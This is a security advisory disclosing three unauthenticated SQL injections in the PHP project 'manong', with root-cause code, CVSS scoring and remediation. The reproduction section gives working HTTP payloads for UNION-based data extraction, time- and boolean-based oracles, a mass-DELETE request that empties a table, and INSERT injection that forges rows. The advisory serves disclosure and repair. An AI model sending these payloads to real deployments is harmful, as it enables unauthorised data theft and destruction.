# manong SQL Injection

**CWE-89 · Unauthenticated · Three independent SQL injections (UNION read / mass DELETE / INSERT injection)**

> **Vendor:** nemoTyrant
> **Product:** manong (PHP/MySQL crawler helper for the Manong Weekly archive)
> **Affected version:** master branch, latest as of 2026-09-27 (commit 7c9e522); no official release version
> **Affected endpoints:** `POST /index.php?a=crawl` (POST `number`) · `GET /index.php?a=del` (GET `id`) · `GET /index.php?a=add` (GET `title`/`desc`/`href`/`number`/`newcate`)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

manong's dispatcher (`index.php:6`) calls the function named by the `a` GET parameter with no authentication anywhere in the application. Request parameters are concatenated raw into PDO `query()`/`exec()` calls, giving three independently exploitable unauthenticated SQL injections: a UNION-based full-read on `a=crawl`, a boolean/time-based injection with arbitrary mass DELETE on `a=del`, and an INSERT injection on `a=add` that forges fully attacker-controlled rows. Verified against MySQL 8.0.39 / PHP 8.4 in a local, isolated instance.

## 2. Root Cause

| # | File:Line | Sink | Input |
|---|---|---|---|
| 1 | `func.php:264` (`manongdb::cache()`, reached from `crawl()` `func.php:65`) | `select * from cache where number={$number}` | POST `number` |
| 2 | `func.php:275` (`manongdb::del_cache()`, reached from `del()` `func.php:152`) | `delete from cache where id={$id}` | GET `id` |
| 3 | `func.php:352` (`arr2sql()` insert branch, values built at `func.php:350`; reached from `add()` `func.php:126-141` → `manongdb::add()` `func.php:371`) | `insert into issue (...) values('{$v1}','{$v2}',...)` | GET `title`/`desc`/`href`/`number`/`newcate` |

```php
// (1) func.php:263-269 — POST number interpolated raw
function cache($number) {
    $data = $this->pdo->query("select * from cache where number={$number}")->fetchAll(PDO::FETCH_ASSOC);
    ...
}

// (2) func.php:274-276 — GET id interpolated raw into a DELETE
function del_cache($id) {
    return $this->pdo->exec("delete from cache where id={$id}");
}

// (3) func.php:348-352 — INSERT values built by "'{$v}'" concatenation
foreach ($arr as $key => $v) {
    $fields[] = "`{$key}`";
    $values[] = "'{$v}'";
}
return "insert into {$dbname} (" . implode(',', $fields) . ") values(" . implode(',', $values) . ")";
```

Common pre-condition: `index.php:6` dispatches `$_GET['a']` as a function name; no authentication, no CSRF protection, no input casting anywhere (`$number = $_POST['number']`, `$id = $_GET['id']`, `$data` values only `trim()`'d).

## 3. Prerequisites

- None. All three endpoints are reachable unauthenticated with a single request; no configuration or interaction required.

## 4. Reproduction

### 4.1 `a=crawl` — UNION-based full read (full response echo)

```http
POST /index.php?a=crawl HTTP/1.1
Content-Type: application/x-www-form-urlencoded

number=0 UNION SELECT 1,version(),database(),4,5,6-- -
```

The rendered page echoes the row fields unescaped, so extracted data is visible directly:

```
value='8.0.39'      <- version()
value='manong'      <- database()
...
```

Boolean oracle: `number=1 AND 1=1` renders 1 cached item; `number=1 AND 1=2` renders 0 items. Table content exfiltration: `number=0 UNION SELECT 1,group_concat(category),3,4,5,6 FROM issue-- -` returned `PHP,PYTHON`.

### 4.2 `a=del` — boolean/time-based injection + arbitrary mass DELETE

```http
GET /index.php?a=del&id=3 AND 1=1     -> {"res":1}
GET /index.php?a=del&id=3 AND 1=2     -> {"res":0}
GET /index.php?a=del&id=1 AND SLEEP(4)-> 5s response (0s control)
GET /index.php?a=del&id=1 OR 1=1      -> {"res":1} and the ENTIRE cache table deleted (row count 3 -> 0, verified in the DB)
```

### 4.3 `a=add` — INSERT injection (attacker-shaped rows)

```http
GET /index.php?a=add&title=x','d',(select version()),'1','C','0',0,0)-- -&desc=&href=&number=1
```

Executed a subquery inside the INSERT and stored its result in an attacker-chosen column — DB row id=4: `title=x, desc=d, href=8.0.39, number=1, category=C`.

```http
GET /index.php?a=add&title=x3','ANYDESC','http://evil','777','EVIL','AAAA',0,0)-- -
```

Inserted a fully attacker-controlled row (id=6: `x3 / ANYDESC / http://evil / 777 / EVIL`). The server-side `md5()` hash and `time()` fields were overridden inside the injected payload, bypassing that logic entirely.

## 5. Confirmed Techniques

- UNION-based exfiltration with full-response echo (`version()`, `database()`, `group_concat(category)` all rendered into the page).
- Boolean oracle on both `a=crawl` (rendered item count 1 vs 0) and `a=del` (`{"res":1}` vs `{"res":0}`).
- Time-based confirmation on `a=del` (`SLEEP(4)` → 5s vs 0s control).
- Mass-deletion primitive: `OR 1=1` wiped the cache table (3 rows → 0, verified directly in the database).
- INSERT injection with subquery execution and column redirection; attacker-controlled rows landed verbatim (ids 4 and 6 in the test DB).

## 6. Impact

- Unauthenticated full database read via UNION (any table/schema reachable from the connection, including contents of `cache` and `issue`).
- Arbitrary data destruction (mass DELETE of the whole cache table).
- Row forging / stored-content control via INSERT injection (feeds the same tables the frontend renders — see the companion stored-XSS disclosure for the DOM sink).
- Any credential material found through exfiltration is reported as `<REDACTED>` in public copies; only format/existence evidence is retained.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (Base 9.8 Critical)

## 8. Remediation

- Use PDO prepared statements with bound parameters in `cache()`, `del_cache()`, and `arr2sql()`; never build SQL by string concatenation of request data.
- Cast numeric request parameters: `$number = (int)$_POST['number'];`, `$id = (int)$_GET['id'];`.
- Remove the unauthenticated dynamic function dispatch (`$_GET['a']()`), or gate the mutating actions (`del`, `add`) behind authentication and CSRF tokens.

## 9. References

- Project: https://github.com/nemoTyrant/manong
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- External disclosure: https://gist.github.com/qianqiusujiu/976ef9fc8a174b7fe024533336c6b9b8
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
